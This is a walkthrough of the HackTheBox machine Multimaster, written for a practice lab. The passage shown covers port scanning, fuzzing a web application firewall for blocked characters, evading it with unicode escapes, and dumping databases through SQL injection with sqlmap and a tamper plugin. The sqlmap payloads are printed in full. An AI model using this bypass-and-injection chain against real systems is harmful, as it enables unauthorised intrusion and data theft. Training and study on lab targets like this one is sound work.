@@ -1,0 +1,1240 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Multimaster</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#htb-multimaster">htb-multimaster</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#wfuzz">wfuzz</a> <a class="post-tag" href="/tags#waf">waf</a> <a class="post-tag" href="/tags#filter">filter</a> <a class="post-tag" href="/tags#unicode">unicode</a> <a class="post-tag" href="/tags#sqlmap">sqlmap</a> <a class="post-tag" href="/tags#tamper">tamper</a> <a class="post-tag" href="/tags#hashcat">hashcat</a> <a class="post-tag" href="/tags#crackmapexec">crackmapexec</a> <a class="post-tag" href="/tags#cyberchef">cyberchef</a> <a class="post-tag" href="/tags#python">python</a> <a class="post-tag" href="/tags#sqli">sqli</a> <a class="post-tag" href="/tags#injection">injection</a> <a class="post-tag" href="/tags#windows">windows</a> <a class="post-tag" href="/tags#mssql">mssql</a> <a class="post-tag" href="/tags#rid">rid</a> <a class="post-tag" href="/tags#evil-winrm">evil-winrm</a> <a class="post-tag" href="/tags#cef-debugging">cef-debugging</a> <a class="post-tag" href="/tags#reverse-engineering">reverse-engineering</a> <a class="post-tag" href="/tags#bloodhound">bloodhound</a> <a class="post-tag" href="/tags#amsi">amsi</a> <a class="post-tag" href="/tags#powersploit">powersploit</a> <a class="post-tag" href="/tags#as-rep-roast">as-rep-roast</a> <a class="post-tag" href="/tags#server-operators">server-operators</a> <a class="post-tag" href="/tags#service">service</a> <a class="post-tag" href="/tags#service-hijack">service-hijack</a> <a class="post-tag" href="/tags#sebackupprivilege">sebackupprivilege</a> <a class="post-tag" href="/tags#serestoreprivilege">serestoreprivilege</a> <a class="post-tag" href="/tags#robocopy">robocopy</a> <a class="post-tag" href="/tags#cve-2020-1472">cve-2020-1472</a> <a class="post-tag" href="/tags#zerologon">zerologon</a> <a class="post-tag" href="/tags#htb-forest">htb-forest</a> <a class="post-tag" href="/tags#osep-like">osep-like</a> <a class="post-tag" href="/tags#oscp-plus-v3">oscp-plus-v3</a> </span><br/><br/>
+<time class="dt-published" datetime="2020-09-19T13:45:01+00:00" itemprop="datePublished">Sep 19, 2020
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2020/09/19/htb-multimaster.html" style="color: #e6e6e6; text-decoration: none;">HTB: Multimaster</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/multimaster-cover.webp" type="image/webp"/>
+<img alt="Multimaster" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/multimaster-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:120px;">
+</img></picture>
+<p>Multimaster was a lot of steps, some of which were quite difficult. I’ll start by identifying a SQL injection in a website. I’ll have to figure out the WAF and find a way past that, dumping credentials but also writing a script to use MSSQL to enumerate the domain users. To pivot to the second user, I’ll exploit an instance of Visual Studio Code that’s left an open CEF debugging socket open. That user has access to a DLL in the web directory, in which I’ll find more credentials to pivot to another user. This user has GenericWrite privileges on another user, so I’ll abuse that to get a shell. This final user is in the Server Operators group, allowing me to modify services to get a shell as SYSTEM. I’ll show two alternative roots, abusing the last user’s SeBackupPrivilege and SeRestorePrivilege with robotcopy to read the flag, and using ZeroLogon to go right to administrator in one step.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/232 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/multimaster" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Multimaster</a> <a href="https://hackthebox.com/machines/multimaster" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-multimaster.webp" type="image/webp"/> <img alt="Multimaster" class="img-av" src="/icons/box-multimaster.png"/></picture></a><br/><a href="https://hackthebox.com/machines/multimaster" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1235919487196712960">07 Mar 2020</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">19 Sep 2020</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Windows <picture><source srcset="/icons/Windows.webp" type="image/webp"/><img alt="Windows" class="img-os" src="/icons/Windows.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Insane">Insane [50]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/multimaster-diff.webp" type="image/webp"/><img alt="Rated difficulty for Multimaster" src="/img/multimaster-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/multimaster-radar.webp" type="image/webp"/><img alt="Radar chart for Multimaster" src="/img/multimaster-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">17:00:56</span><a href="https://app.hackthebox.com/users/76469" rel="noopener" target="_blank"><img alt="haqpl" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/76469" style="display: unset"/><span class="user-text" style="display: none"> haqpl</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">21:32:36</span><a href="https://app.hackthebox.com/users/9267" rel="noopener" target="_blank"><img alt="snowscan" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/9267" style="display: unset"/><span class="user-text" style="display: none"> snowscan</span></a><br/></td>
+</tr>
+<tr>
+<td>Creators</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/8308" rel="noopener" target="_blank"><img alt="MinatoTW" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/8308" style="display: unset"/><span class="user-text" style="display: none"> MinatoTW</span></a><br/> <a href="https://app.hackthebox.com/users/1190" rel="noopener" target="_blank"><img alt="egre55" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/1190" style="display: unset"/><span class="user-text" style="display: none"> egre55</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> revealed a bunch of ports, including many typical of a Windows domain controller:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS&gt;</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="nt">-p</span><span class="o">-</span><span class="w"> </span><span class="nt">--min-rate</span><span class="w"> </span><span class="nx">10000</span><span class="w"> </span><span class="nt">-oA</span><span class="w"> </span><span class="o">.</span><span class="nx">\scans\alltcp</span><span class="w"> </span><span class="nx">10.10.10.179</span><span class="w">
+</span><span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2020-03-30 18:32 GMT Daylight Time
+Nmap scan report for 10.10.10.179
+Host is up (0.017s latency).
+Not shown: 65513 filtered ports
+PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+3389/tcp  open  ms-wbt-server
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49666/tcp open  unknown
+49667/tcp open  unknown
+49673/tcp open  unknown
+49674/tcp open  unknown
+49676/tcp open  unknown
+49693/tcp open  unknown
+49745/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 14.30 seconds
+
+</span><span class="gp">PS&gt;</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">53</span><span class="p">,</span><span class="nx">80</span><span class="p">,</span><span class="nx">88</span><span class="p">,</span><span class="nx">135</span><span class="p">,</span><span class="nx">139</span><span class="p">,</span><span class="nx">389</span><span class="p">,</span><span class="nx">445</span><span class="p">,</span><span class="nx">464</span><span class="p">,</span><span class="nx">593</span><span class="p">,</span><span class="nx">636</span><span class="p">,</span><span class="nx">3268</span><span class="p">,</span><span class="nx">3269</span><span class="p">,</span><span class="nx">5985</span><span class="p">,</span><span class="nx">9389</span><span class="w"> </span><span class="nt">-sC</span><span class="w"> </span><span class="nt">-sV</span><span class="w"> </span><span class="nt">-oA</span><span class="w"> </span><span class="o">.</span><span class="nx">\scans\tcpscripts</span><span class="w"> </span><span class="nx">10.10.10.179</span><span class="w">
+</span><span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2020-03-30 18:34 GMT Daylight Time
+Nmap scan report for 10.10.10.179
+Host is up (0.0092s latency).
+
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain?
+| fingerprint-strings:
+|   DNSVersionBindReqTCP:
+|     version
+|_    bind
+80/tcp   open  http         Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: MegaCorp
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-03-30 17:44:26Z)
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp open  mc-nmf       .NET Message Framing
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.70%I=7%D=3/30%Time=5E822DB2%P=i686-pc-windows-windows%r(
+SF:DNSVersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07vers
+SF:ion\x04bind\0\0\x10\0\x03");
+Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h29m50s, deviation: 4h02m31s, median: 9m48s
+| smb-os-discovery:
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: MULTIMASTER
+|   NetBIOS computer name: MULTIMASTER\x00
+|   Domain name: MEGACORP.LOCAL
+|   Forest name: MEGACORP.LOCAL
+|   FQDN: MULTIMASTER.MEGACORP.LOCAL
+|_  System time: 2020-03-30T10:46:41-07:00
+| smb-security-mode:
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2020-03-30 18:46:38
+|_  start_date: 2020-03-30 17:04:52
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 182.14 seconds
+</span></code></pre></div></div>
+<p>The OS looks like Windows Server 2016.</p>
+<h3 id="smb---tcp-445">SMB - TCP 445</h3>
+<p>I’m not able to connect to any shares without creds:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS&gt;</span><span class="w"> </span><span class="n">net</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">10.10.10.179</span><span class="w">
+</span><span class="go">System error 5 has occurred.
+
+Access is denied.
+</span></code></pre></div></div>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The site is the MegaCorp Employee Hub:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200330164330599.webp" type="image/webp"/>
+<img alt="image-20200330164330599" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200330164330599.png"/>
+</picture>
+<p>None of the buttons really do anything. The Gallery link goes to some pictures. The Colleague Finder link presents a form:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200330202803296.webp" type="image/webp"/>
+<img alt="image-20200330202803296" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200330202803296.png"/>
+</picture>
+<p>If I just hit enter, little red text comes up saying “Required.”, but then all the employees come back anyway:</p>
+<div style="max-height: 500px; overflow: hidden; position: relative; margin-bottom: 20px;">
+<a href="https://0xdfimages.gitlab.io/img/image-20200330202944256.png">
+<img alt="image-20200330202944256" src="https://0xdfimages.gitlab.io/img/image-20200330202944256.png" style="clip-path: polygon(0 0, 100% 0, 100% 460px, 49% 490px, 51% 470px, 0 500px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 460px, 49% 490px, 51% 470px, 0 500px)"/>
+</a>
+<div style="position: absolute; right: 20px; top: 475px"><a href="https://0xdfimages.gitlab.io/img/image-20200330202944256.png"><i>Click for full image</i></a></div>
+</div>
+<p>I’ll start a list of user names.</p>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I started a <code class="language-plaintext highlighter-rouge">gobuster</code> on the site, but after a few requests, everything starts coming back 403. That basically says the WAF is blocking too many requests. I could play with really slowing things down, but at this point, I’ll save that for later.</p>
+<h2 id="shell-as-tushikikatomo">Shell as tushikikatomo</h2>
+<h3 id="identify-sqli-in-colleague-finder">Identify SQLi in Colleague Finder</h3>
+<h4 id="enumeration">Enumeration</h4>
+<p>The source for the Colleague Finder page basically just loads JavaScript which I choose not to dive into for now. I can see in Burp that when I submit a string, it sends a request like the following:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/api/getColleagues</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.10.179</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">application/json, text/plain, */*</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://10.10.10.179/</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json;charset=utf-8</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">11</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+
+<span class="p">{</span><span class="nl">"name"</span><span class="p">:</span><span class="s2">""</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>Given the JSON input, I tried to do some quick NoSQL Injection fuzzing. For example, I tried <code class="language-plaintext highlighter-rouge">{"name":{"$ne":"0xdf"}}</code>, but it just returned an empty array. After a few more tries, it seems like this isn’t NoSQL injectable.</p>
+<h4 id="enumerate-waf">Enumerate WAF</h4>
+<p>I played with trying to get the App to throw an SQL error but continually ran into the WAF. I started a <code class="language-plaintext highlighter-rouge">wfuzz</code> to look for banned characters. The first time I ran it, everything was banned:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>wfuzz <span class="nt">-c</span> <span class="nt">-u</span> http://10.10.10.179/api/getColleagues <span class="nt">-w</span> /usr/share/seclists/Fuzzing/special-chars.txt <span class="nt">-d</span> <span class="s1">'{"name":"FUZZ"}'</span> <span class="nt">-H</span> <span class="s1">'Content-Type: application/json;charset=utf-8'</span> <span class="nt">-t</span> 1              
+<span class="go">
+********************************************************
+* Wfuzz 2.4.5 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.179/api/getColleagues
+Total requests: 32
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload
+===================================================================
+
+000000001:   403        29 L     92 W     1233 Ch     "~"
+000000002:   403        29 L     92 W     1233 Ch     "!"
+000000003:   403        29 L     92 W     1233 Ch     "@"
+000000004:   403        29 L     92 W     1233 Ch     "#"
+000000005:   403        29 L     92 W     1233 Ch     "$"
+000000006:   403        29 L     92 W     1233 Ch     "%"
+000000007:   403        29 L     92 W     1233 Ch     "^"
+000000008:   403        29 L     92 W     1233 Ch     "&amp;"
+000000009:   403        29 L     92 W     1233 Ch     "*"
+000000010:   403        29 L     92 W     1233 Ch     "("
+000000011:   403        29 L     92 W     1233 Ch     ")"
+000000012:   403        29 L     92 W     1233 Ch     "_"
+000000013:   403        29 L     92 W     1233 Ch     "_"
+000000014:   403        29 L     92 W     1233 Ch     "+"
+000000015:   403        29 L     92 W     1233 Ch     "="
+000000016:   403        29 L     92 W     1233 Ch     "{"
+000000017:   403        29 L     92 W     1233 Ch     "}"
+000000018:   403        29 L     92 W     1233 Ch     "]"
+000000019:   403        29 L     92 W     1233 Ch     "["
+000000020:   403        29 L     92 W     1233 Ch     "|"
+000000021:   403        29 L     92 W     1233 Ch     "\"
+000000022:   403        29 L     92 W     1233 Ch     "`"
+000000023:   403        29 L     92 W     1233 Ch     ","
+000000024:   403        29 L     92 W     1233 Ch     "."
+000000025:   403        29 L     92 W     1233 Ch     "/"
+000000026:   403        29 L     92 W     1233 Ch     "?"
+000000027:   403        29 L     92 W     1233 Ch     ";"
+000000028:   403        29 L     92 W     1233 Ch     ":"
+000000029:   403        29 L     92 W     1233 Ch     "'"
+000000030:   403        29 L     92 W     1233 Ch     """
+000000031:   403        29 L     92 W     1233 Ch     "&lt;"
+000000032:   403        29 L     92 W     1233 Ch     "&gt;"
+
+Total time: 0.436510                                       
+Processed Requests: 32                                     
+Filtered Requests: 0                                       
+Requests/sec.: 73.30872 
+</span></code></pre></div></div>
+<p>That seemed unlikely, so I found the parameter <code class="language-plaintext highlighter-rouge">-t</code> which is the number of concurrent connections. I ran it again with <code class="language-plaintext highlighter-rouge">-t 1</code>, and I’ll also hide the 200 responses:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>wfuzz <span class="nt">-c</span> <span class="nt">-u</span> http://10.10.10.179/api/getColleagues <span class="nt">-w</span> /usr/share/seclists/Fuzzing/special-chars.txt <span class="nt">-d</span> <span class="s1">'{"name":"FUZZ"}'</span> <span class="nt">-H</span> <span class="s1">'Content-Type: application/json;charset=utf-8'</span> <span class="nt">-t</span> 1 <span class="nt">--hc</span> 200
+<span class="go">
+********************************************************
+* Wfuzz 2.4.5 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.179/api/getColleagues
+Total requests: 32
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload
+===================================================================
+
+000000004:   403        29 L     92 W     1233 Ch     "#"
+000000021:   500        0 L      4 W      36 Ch       "\"
+000000029:   403        29 L     92 W     1233 Ch     "'"
+000000030:   500        0 L      4 W      36 Ch       """
+000000031:   403        29 L     92 W     1233 Ch     "&lt;"
+000000032:   403        29 L     92 W     1233 Ch     "&gt;"
+
+Total time: 0.537886
+Processed Requests: 32
+Filtered Requests: 26
+Requests/sec.: 59.49209
+</span></code></pre></div></div>
+<p>So the banned characters are at least <code class="language-plaintext highlighter-rouge">#'&lt;&gt;</code>, and <code class="language-plaintext highlighter-rouge">"</code> breaks things because its double quotes already and <code class="language-plaintext highlighter-rouge">\</code> is the escape character.</p>
+<h4 id="unicode">Unicode</h4>
+<p>To get <code class="language-plaintext highlighter-rouge">wfuzz</code> working, I had to add the header for <code class="language-plaintext highlighter-rouge">Content-Type</code>. I just grabbed it out of the request I had from Burp, but I noticed it specifically called out the <code class="language-plaintext highlighter-rouge">charset=utf-8</code>. I looked up the character <code class="language-plaintext highlighter-rouge">'</code>, and it’s ASCII hex value is 0x27. So I sent the name <code class="language-plaintext highlighter-rouge">\u27</code>, and got back and error:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200330205309230.webp" type="image/webp"/>
+<img alt="image-20200330205309230" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200330205309230.png"/>
+</picture>
+<p>That is a good sign there’s SQL injection, even if blind.</p>
+<h3 id="database-dump">Database Dump</h3>
+<p>Rather than do this manually (way too much encoding), I’ll turn to <code class="language-plaintext highlighter-rouge">sqlmap</code>. I’ll right click on the request in Burp and select “Copy to file”, saving it as <code class="language-plaintext highlighter-rouge">colleagues.request</code>. I’ll need some features:</p>
+<ul>
+<li>The <code class="language-plaintext highlighter-rouge">charunicodeescape</code> <a href="https://github.com/sqlmapproject/sqlmap/blob/master/tamper/charunicodeescape.py">tamper plugin</a> will unicode encode all the characters in the payload. This will avoid the WAF checking for bad characters.</li>
+<li><code class="language-plaintext highlighter-rouge">--delay 5</code> will slow down the process to one request every 5 seconds. It may have been able to go faster, but I was walking away for a bit, so I left it with this. I added <code class="language-plaintext highlighter-rouge">--proxy</code> so that I could see that requests were still going through Burp when it looks frozen.</li>
+<li><code class="language-plaintext highlighter-rouge">--level 5 --risk 3</code> turns up the things it’s willing to try to the max. <code class="language-plaintext highlighter-rouge">--batch</code> will take the default answer to any prompts.</li>
+</ul>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>sqlmap <span class="nt">-r</span> colleagues.request <span class="nt">--tamper</span><span class="o">=</span>charunicodeescape <span class="nt">--delay</span> 5 <span class="nt">--level</span> 5 <span class="nt">--risk</span> 3 <span class="nt">--batch</span> <span class="nt">--proxy</span> http://127.0.0.1:8080
+<span class="sqlmap-header-yellow">        ___
+       __H__
+ ___ ___[']_____ ___ ___  </span><span class="go">{</span><span class="sqlmap-header-blue">1.4.3#stable</span><span class="go">}</span><span class="sqlmap-header-yellow">
+|_ -| . [</span><span class="sqlmap-header-red">.</span><span class="sqlmap-header-yellow">]     | .'| . |
+|___|_  [</span><span class="sqlmap-header-red">,</span><span class="sqlmap-header-yellow">]_|_|_|__,|  _|
+      |_|V...       |_|   </span><span class="go">http://sqlmap.org
+...[snip]...
+[*] starting @ 18:08:31 /2020-03-30/
+
+[</span><span class="sqlmap-timestamp">18:08:31</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] parsing HTTP request from 'colleagues.request'
+[</span><span class="sqlmap-timestamp">18:08:31</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] loading tamper module 'charunicodeescape'
+JSON data found in POST body. Do you want to process it? [Y/n/q] Y
+...[snip]...
+[</span><span class="sqlmap-timestamp">18:31:01</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] (custom) POST parameter 'JSON name' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+[</span><span class="sqlmap-timestamp">18:31:01</span><span class="go">] [</span><span class="sqlmap-warn">WARNING</span><span class="go">] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+(custom) POST parameter 'JSON name' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 258 HTTP(s) requests:
+---                                                        
+Parameter: JSON name ((custom) POST)                       
+    Type: boolean-based blind                              
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: {"name":"test' OR NOT 3782=3782-- bJBd"}
+
+    Type: stacked queries                                  
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"name":"test';WAITFOR DELAY '0:0:5'--"}
+
+    Type: time-based blind                                 
+    Title: Microsoft SQL Server/Sybase time-based blind (IF)                                                          
+    Payload: {"name":"test' WAITFOR DELAY '0:0:5'-- FvDZ"}
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: {"name":"test' UNION ALL SELECT 58,58,58,CHAR(113)+CHAR(112)+CHAR(122)+CHAR(107)+CHAR(113)+CHAR(68)+CHAR(105)+CHAR(69)+CHAR(119)+CHAR(71)+CHAR(98)+CHAR(76)+CHAR(83)+CHAR(102)+CHAR(68)+CHAR(114)+CHAR(73)+CHAR(109)+CHAR(73)+CH
+AR(98)+CHAR(101)+CHAR(116)+CHAR(99)+CHAR(70)+CHAR(80)+CHAR(103)+CHAR(101)+CHAR(86)+CHAR(113)+CHAR(73)+CHAR(82)+CHAR(103)+CHAR(90)+CHAR(115)+CHAR(114)+CHAR(76)+CHAR(73)+CHAR(77)+CHAR(105)+CHAR(103)+CHAR(73)+CHAR(71)+CHAR(67)+CHAR(83)+CHAR
+(111)+CHAR(113)+CHAR(98)+CHAR(120)+CHAR(98)+CHAR(113),58-- gxQm"}
+---
+[</span><span class="sqlmap-timestamp">18:31:01</span><span class="go">] [</span><span class="sqlmap-warn">WARNING</span><span class="go">] changes made by tampering scripts are not included in shown payload content(s)
+[</span><span class="sqlmap-timestamp">18:31:02</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] testing Microsoft SQL Server
+[</span><span class="sqlmap-timestamp">18:31:07</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] confirming Microsoft SQL Server
+[</span><span class="sqlmap-timestamp">18:31:22</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] the back-end DBMS is Microsoft SQL Server
+back-end DBMS: Microsoft SQL Server 2017                   
+[</span><span class="sqlmap-timestamp">18:31:22</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.179' 
+</span></code></pre></div></div>
+<p>With that success, now I can run with <code class="language-plaintext highlighter-rouge">--dbs</code> to list the databases. There are five:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>sqlmap <span class="nt">-r</span> colleagues.request <span class="nt">--tamper</span><span class="o">=</span>charunicodeescape <span class="nt">--delay</span> 5 <span class="nt">--level</span> 5 <span class="nt">--risk</span> 3 <span class="nt">--batch</span> <span class="nt">--proxy</span> http://127.0.0.1:8080 <span class="nt">--dbs</span>
+<span class="go">...[snip]...
+[</span><span class="sqlmap-timestamp">21:19:29</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] fetching database names
+available databases [5]:
+[*] Hub_DB
+[*] master
+[*] model
+[*] msdb
+[*] tempdb
+</span></code></pre></div></div>
+<p>I could next list the tables, but I actually went the more “nuke it from space” route, and ran <code class="language-plaintext highlighter-rouge">--dump-all</code> and <code class="language-plaintext highlighter-rouge">--exclude-sysdbs</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>sqlmap <span class="nt">-r</span> colleagues.request <span class="nt">--tamper</span><span class="o">=</span>charunicodeescape <span class="nt">--delay</span> 5 <span class="nt">--level</span> 5 <span class="nt">--risk</span> 3 <span class="nt">--batch</span> <span class="nt">--proxy</span> http://127.0.0.1:8080 <span class="nt">--dump-all</span> <span class="nt">--exclude-sysdbs</span>
+<span class="go">...[snip]...
+[</span><span class="sqlmap-timestamp">18:51:58</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] the back-end DBMS is Microsoft SQL Server
+back-end DBMS: Microsoft SQL Server 2017                   
+[</span><span class="sqlmap-timestamp">18:51:58</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] sqlmap will dump entries of all tables from all databases now
+[</span><span class="sqlmap-timestamp">18:51:58</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] fetching database names                  
+[</span><span class="sqlmap-timestamp">18:52:08</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] fetching tables for databases: Hub_DB, master, model, msdb, tempdb
+[</span><span class="sqlmap-timestamp">18:52:08</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] skipping system database 'master'
+[</span><span class="sqlmap-timestamp">18:52:08</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] skipping system database 'model'
+[</span><span class="sqlmap-timestamp">18:52:08</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] skipping system database 'msdb'
+[</span><span class="sqlmap-timestamp">18:52:08</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] skipping system database 'tempdb'
